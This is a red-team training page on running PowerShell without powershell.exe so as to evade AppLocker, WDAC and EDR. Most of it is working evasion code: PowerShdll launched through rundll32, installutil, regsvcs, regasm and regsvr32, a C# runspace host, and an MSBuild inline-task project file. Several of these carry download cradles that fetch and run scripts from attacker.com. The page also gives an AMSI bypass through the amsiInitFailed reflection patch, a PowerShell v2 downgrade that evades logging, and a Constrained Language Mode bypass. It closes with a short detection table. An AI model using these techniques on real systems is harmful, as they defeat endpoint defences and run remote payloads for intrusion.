---
layout: training-page
title: "PowerShell Without powershell.exe — Red Team Academy"
module: "Evasion"
tags:
  - powershell
  - applocker-bypass
  - lolbas
  - powershdll
  - constrained-language
  - t1218
page_key: "evasion-powershell-without-ps"
render_with_liquid: false
---

# PowerShell Without powershell.exe

Blocking `powershell.exe` is a common defensive measure — AppLocker rules, WDAC policies, and EDR detections frequently target it. But PowerShell is a .NET runtime accessible through multiple alternate host processes. Running PowerShell through `rundll32.exe`, `installutil.exe`, or custom .NET code lets you execute PS commands without ever spawning `powershell.exe`.

MITRE ATT&CK: **T1218** — Signed Binary Proxy Execution

---

## Why Block powershell.exe Doesn't Fully Work

`powershell.exe` is just one host for the `System.Management.Automation` .NET assembly. Any .NET process that loads this assembly can execute PowerShell commands and runspaces. The assembly itself is not blocked by AppLocker (it's in System32 and signed by Microsoft).

---

## Method 1: PowerShDLL (rundll32 Host)

PowerShDLL loads the `System.Management.Automation` assembly inside `rundll32.exe`, giving you an interactive PowerShell session without `powershell.exe`:

```bash
# GitHub: https://github.com/p3nt4/PowerShdll

# Interactive PowerShell session via rundll32
rundll32 PowerShdll.dll,main

# Execute a single command
rundll32 PowerShdll.dll,main -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Run encoded command
rundll32 PowerShdll.dll,main -e <base64EncodedCommand>
```

The parent process in the event log is `rundll32.exe`, not `powershell.exe`. ScriptBlock logging and AMSI still apply if the DLL loads them — but process-name-based detection misses it.

### Other DLL Loaders in PowerShDLL

```bash
# installutil.exe host
installutil /logfile= /LogToConsole=false /U PowerShdll.dll

# regsvcs.exe host
regsvcs PowerShdll.dll

# regasm.exe host
regasm /U PowerShdll.dll

# regsvr32.exe (executes DllRegisterServer)
regsvr32 /s PowerShdll.dll
```

---

## Method 2: System.Management.Automation Directly (.NET)

Any .NET application can host a PowerShell runspace by referencing `System.Management.Automation`:

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

class PSHost {
    static void Main(string[] args) {
        string command = args.Length > 0 ? args[0] :
            "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')";

        using (Runspace runspace = RunspaceFactory.CreateRunspace()) {
            runspace.Open();
            using (Pipeline pipeline = runspace.CreatePipeline()) {
                pipeline.Commands.AddScript(command);
                pipeline.Commands.Add("Out-String");
                var results = pipeline.Invoke();
                foreach (var result in results) {
                    Console.WriteLine(result.ToString());
                }
            }
        }
    }
}
```

Compile and execute:

```bash
# Compile with .NET SDK
csc /r:System.Management.Automation.dll PSHost.cs

# Run — no powershell.exe process
PSHost.exe "Get-Process"
```

---

## Method 3: PowerShell Runspace via Reflection (Fully In-Memory)

Load `System.Management.Automation` via reflection in a running .NET process — no separate binary:

```powershell
# PowerShell ≥ 2.0: use -Version 2 to bypass ScriptBlock logging (if v2 is installed)
powershell.exe -version 2 -command "IEX ..."

# In C# / PowerShell: load SMA from GAC dynamically
[Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")
$runspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$runspace.Open()
$pipeline = $runspace.CreatePipeline()
$pipeline.Commands.AddScript("Get-Process")
$pipeline.Invoke()
```

---

## Method 4: MSBuild Inline Task Execution

`msbuild.exe` can execute C# code via inline tasks — no compilation needed:

```xml
<!-- payload.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Execute">
    <MSBuildCustomTask />
  </Target>
  <UsingTask
    TaskName="MSBuildCustomTask"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Management.Automation;
          using System.Management.Automation.Runspaces;
          using Microsoft.Build.Framework;
          using Microsoft.Build.Utilities;

          public class MSBuildCustomTask : Task {
              public override bool Execute() {
                  using (Runspace rs = RunspaceFactory.CreateRunspace()) {
                      rs.Open();
                      Pipeline p = rs.CreatePipeline();
                      p.Commands.AddScript("IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')");
                      p.Invoke();
                  }
                  return true;
              }
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

```cmd
msbuild payload.csproj
```

---

## Constrained Language Mode Bypass

When PowerShell is in Constrained Language Mode (CLM), many APIs and .NET types are blocked. CLM is typically enforced by WDAC or AppLocker in whitelist mode.

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# Constrained Language Mode restrictions:
# - No Add-Type
# - No [Type]::Method() syntax for non-approved types
# - No COM object instantiation
# - No reflection
```

**Bypass via alternate host**: if you spawn PowerShell through an unmanaged process (C++ loader), CLM may not apply — CLM is enforced only when the PS engine detects it's under WDAC/AppLocker control.

---

## AMSI in Alternate Hosts

AMSI is initialized by `System.Management.Automation` regardless of the host process. All three methods above will still trigger AMSI scanning unless explicitly bypassed.

```csharp
// AMSI bypass before running PS commands (in the .NET host)
// Standard amsiInitFailed patch applied via reflection to the SMA assembly
var amsi = typeof(System.Management.Automation.AmsiUtils);
var field = amsi.GetField("amsiInitFailed",
    System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
field.SetValue(null, true);
```

---

## Detection

| Signal | Source |
|--------|--------|
| `rundll32.exe` loading `System.Management.Automation.dll` | Image load events |
| `installutil.exe` / `regsvcs.exe` / `msbuild.exe` with unusual arguments | Process command line |
| `System.Management.Automation` loaded in non-PowerShell process | EDR image load |
| ScriptBlock logging events from non-powershell.exe process | PowerShell ETW |
| Outbound HTTP from `rundll32.exe` | Network |

---

## Resources

- PowerShDLL (rundll32 PS host) — `github.com/p3nt4/PowerShdll`
- PowerLessShell (MSBuild payload generator) — `github.com/Mr-Un1k0d3r/PowerLessShell`
- MITRE ATT&CK T1218 — Signed Binary Proxy Execution — `attack.mitre.org/techniques/T1218/`
- PSAmsi (AMSI bypass framework) — `github.com/cobbr/PSAmsi`
- Constrained Language Mode research (Lee Holmes) — `devblogs.microsoft.com/powershell/powershell-constrained-language-mode/`
